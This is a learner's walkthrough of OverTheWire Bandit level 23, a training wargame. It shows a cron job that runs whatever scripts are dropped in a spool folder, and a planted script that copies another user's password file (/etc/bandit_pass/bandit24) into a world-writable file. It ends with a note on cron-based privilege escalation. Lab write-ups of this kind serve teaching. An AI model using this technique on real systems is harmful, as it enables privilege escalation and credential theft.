
Connecting to ssh level 23 using the credentials from Prv level

ssh bandit23@bandit.labs.overthewire.org -p 2220
Password String Intentionally Omitted 


## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)




bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/mysecretfolder
cd /tmp/mysecretfolder
bandit23@bandit:/tmp/mysecretfolder$ touch bandit24.pwd
bandit23@bandit:/tmp/mysecretfolder$ chmod 777 bandit24.pwd
bandit23@bandit:/tmp/mysecretfolder$ echo '#!/bin/bash' > solve.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/mysecretfolder/bandit24.pwd' >> solve.sh
bandit23@bandit:/tmp/mysecretfolder$ chmod 777 solve.sh
bandit23@bandit:/tmp/mysecretfolder$ cp solve.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/mysecretfolder$ ls
bandit24.pwd  solve.sh
%%Wait 60 seconds%%
bandit23@bandit:/tmp/mysecretfolder$ cat bandit24.pwd
Password String Intentionally Omitted 



Explanation of this level step-by-step
1. logged in and used cd cmd to get in of /etc/cron.d/
2. then used ls to look inside the folder
3. then used cat cronjob_bandit24 as it seemed to be the right file to look at as it is the next level
4. then i used the cat cmd again to read the script which gave this as output
5. #!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

which i didn't understand a bit this time, so used ai to explain it to me & it gave me the following explanation 

**Line-by-Line Breakdown**

1. `shopt -s nullglob`

- **In simple words:** This is a safety setting for the script. If the folder is completely empty, it tells the script to do nothing rather than glitching out trying to find invisible files.

2. `myname=$(whoami)`

- **In simple words:** It checks who is running the script. Since the cron job runs this as `bandit24`, the variable `$myname` becomes `"bandit24"`.

3. `cd /var/spool/"$myname"/foo || exit`

- **In simple words:** The script tries to enter the folder `/var/spool/bandit24/foo`. If that folder doesn't exist or it can't enter it, it immediately stops (`exit`) to prevent mistakes. This folder is your **submission box**.

1. `for i in * .*; do`  
- **In simple words:** This starts a **loop**. It tells the computer: _"Look at every single file inside this folder, one by one."_

5. `if [ "$i" != "." ] && [ "$i" != ".." ]; then`

- **In simple words:** Another safety check. In Linux, `.` means the current directory and `..` means the parent directory. This line ensures the script ignores those shortcuts so it doesn't accidentally wipe out the whole server.

6. `owner="$(stat --format "%U" "./$i")"`

- **In simple words:** It looks at the file you dropped in the folder and asks: _"Who created or owns this file?"_ It saves that username into a variable called `$owner`.

7. `if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then`

- **In simple words:** This is the gatekeeper rule. It says: _"I will only process this file if the owner is **bandit23** (that's you!) and it is a regular file."_ This prevents other players or strangers from hijacking the script.

1. `timeout -s 9 60 "./$i"` 
- **In simple words:** This is the magic engine! It **executes (runs) your script**. The `timeout` part ensures that if your script gets stuck or takes too long, it will be forcefully killed after 60 seconds so it doesn't crash the server.

9. `rm -rf "./$i"`

- **In simple words:** The cleanup phase. The moment your script finishes running (or times out), this command completely deletes it from the folder to keep the submission box empty for the next minute.

after understanding the code used the below step-by-step execution plan generated by the ai to solve this level (i wrote most of the code)

1. Make your own directory inside `/tmp` and head inside it. ---> mkdir /tmp/mysecretfolder
cd /tmp/mysecretfolder
2. Create an empty file where the password will eventually be dumped. Open its permissions completely. ---> touch bandit24.pwd
chmod 777 bandit24.pwd
3. Create your script file (you can use `nano` or `echo`). Inside it, write the command to copy/dump the password into your empty file. ---> echo '#!/bin/bash' > solve.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/mysecretfolder/bandit24.pwd' >> solve.sh
4. Open the script's permissions completely (`chmod 777`). ---> chmod 777 solve.sh
5. Copy your script file into the submission box: **`/var/spool/bandit24/foo/`** ---> cp solve.sh /var/spool/bandit24/foo/
6. Wait up to 1 minute for the invisible alarm clock to trigger, run your script, and delete it
7. Ran cat /tmp/mysecretfolder/bandit24.pwd & got the pwd for next level.


NOTE: chmod 777 was needed on both files because the cron script runs as bandit24 (a different user).  Without world-write permission on bandit24.pwd, bandit24 cannot write the password into it. Without world-execute on solve.sh, bandit24 cannot run it.


SOC angle: This level demonstrates a classic cron-based 
privilege escalation technique. If an attacker finds a 
cron job running as a privileged user that executes 
scripts from a world-writable directory, they can drop 
their own malicious script there and have it run with 
elevated privileges — exactly what you did here. 
World-writable directories (/tmp, /var/spool) containing 
executed scripts are a critical misconfiguration that 
SOC analysts and IR teams look for during investigations.